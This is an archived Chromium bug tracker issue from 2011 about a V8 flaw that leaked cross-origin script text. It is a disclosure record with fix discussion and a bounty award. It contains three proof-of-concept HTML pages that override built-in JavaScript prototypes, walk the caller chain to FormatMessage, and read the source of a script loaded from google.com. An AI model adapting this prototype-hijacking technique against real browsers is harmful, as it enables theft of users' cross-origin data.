# Arbitrary cross-origin bypass using SyntaxError and Number prototype overrides

| Field | Value |
|-------|-------|
| **Issue ID** | [40087261](https://issues.chromium.org/issues/40087261) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | sc...@gmail.com |
| **Assignee** | ag...@chromium.org |
| **Created** | 2011-01-26 |
| **Bounty** | $1,337.00 |

## Description

Filing on behalf of Daniel Divricean, splitting out from https://crbug.com/chromium/68187.

Here's the repro to read arbitrary cross-origin text:

<html><head>

<script type="text/javascript">
SyntaxError.prototype.constructor = new Object();
SyntaxError.prototype.constructor.name = 1;
Number.prototype.toString = function () {
	var _caller = this.toString.caller;
	while (_caller.name !== "FormatMessage") {
		_caller = _caller.caller;
	}
	alert(_caller.arguments[0].script.source);
}
SyntaxError.prototype.toString = Object.prototype.toString;
</script>
<script src="http://google.com"></script>

</head><body></body></html>

Affects all versions of Chrome, included a custom build with V8 3.0.11

Online simple example: http://scary.beasts.org/misc/syntaxerr.html
(It loads the XHTML version of your Gmail inbox and shows it to you).

## Timeline

### ag...@chromium.org (2011-01-26)

That's another good one. :) 

I missed the conversion of the constructor name if it is not a string. Fixed by not using the constructor name if it needs conversion. Thanks!

### sc...@gmail.com (2011-01-27)

Sorry, correction, split out from http://code.google.com/p/chromium/issues/detail?id=69187

### di...@gmail.com (2011-01-27)

Maybe there's a way to limit how you can access script.source from caller arguments. Because we may be able to find&fix most of the ways to hook into that, but I'm guessing there are/will be others. 

Seems like I was over-thinking it :) . A more basic approach, works on Chrome 8.0.552.237 and on Chromium 10.0.652.0 (0). Can you verify this?

<html><head>

<script type="text/javascript">
var already = false;
String.prototype.toString = function () {
	var _caller = this.toString.caller;
	while (_caller.name !== "FormatMessage") {
		_caller = _caller.caller;
	}
	
	if (!already && _caller.arguments[0].script) {
		already = true;
		alert(_caller.arguments[0].script.source);
	}
}
</script>
<script src="http://google.com"></script>
</head><body></body></html>


### sc...@gmail.com (2011-01-27)

That variant does seem to be new, unless I've misapplied Mads' latest patch.

### sc...@gmail.com (2011-01-27)

@divricean -- congrats! We'd like to offer you an additional reward for this more serious facet of your original report! Stealing cross-origin data by rewiring the built-in JavaScript objects is pretty leet, so we have no option other than to reward at the $1337 level again!
Thanks also for the test case variant. Keep 'em coming :)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ag...@chromium.org (2011-01-28)

This is a new variant and goes through a completely different path. The issue is that we call into JavaScript for getting information about messages. I will work on getting rid of that so we can control conversions and avoid calling overwritten conversion methods.

Thanks!

### ag...@chromium.org (2011-01-28)

I have fixed this particular variant on this. However, I can still think of ways to use this technique to do something similar. It will be a bit harder to do, but I will leave this bug open until I have created some test cases and closed the holes I find.

Thanks again for reporting these issues!

### di...@gmail.com (2011-01-29)

@scarybeasts: Thanks! I'll try, but @ager is not making it easy for me :)
@ager: np, looks good to me. Maybe I should give it a another try after you finish finding the holes, so we don't overlap.

Here's one that maybe you could verify (if you didn't already), works on Chrome 8.0.552.237 and on Chromium 11.0.654.0 (73091):

<html><head>

<script type="text/javascript">
Object.prototype.hasOwnProperty = function(){
	var _caller = this.toString.caller;
	while (_caller.name !== "FormatMessage") {
		_caller = _caller.caller;
	}
	alert(_caller.arguments[0].script.source);
};
</script>
<script src="http://google.com"></script>

</head><body></body></html>


### ag...@chromium.org (2011-01-31)

Yes, that is one of the cases that I have found too. I'm still playing with variations. I haven't had much time today. I will continue working on this over the next couple of days. I'll let you know when I think I have closed the holes. Please do post any issues that you find in the mean time. The more cases the better so I can feel more confident that this is actually closed. Thanks!

### ag...@chromium.org (2011-02-02)

An update on this. I have closed a couple of holes where user code was called in places where we did not intend it to be called. However, I don't see how to completely avoid user callbacks and still keep the same behavior as other browsers. Therefore, I have a patch out to make the error message state purely internal in the engine and not exposed in JavaScript. That will close the current style of attack where you find the message object that is the argument to FormatMessage and get information from it. You might still be able to get the message object, but to user JavaScript code it will be an empty object with no properties.

Once that lands I think this attack variant has been closed and it is time to start diggin for others. :)

### ag...@chromium.org (2011-02-03)

We should be in a better state now.

@divricean, please do your worst and let's see if we can find more. :)

### sc...@gmail.com (2011-02-14)

This fix will go out with Chrome 10, due early March.

### sc...@gmail.com (2011-03-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-09)

@divricean, we fixed all your awesome bugs in Chrome 10!!
E-mail cevans@chromium.org at your convenience, so we can set up payment :) Thanks again!

### sc...@gmail.com (2011-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-15)

Invoice finalized; payment is in e-payment system.

### sc...@gmail.com (2011-03-15)

[Empty comment from Monorail migration]

### gi...@gmail.com (2011-03-15)

no comment..

### gi...@gmail.com (2011-03-15)

most wanted

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/70877?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087261)*
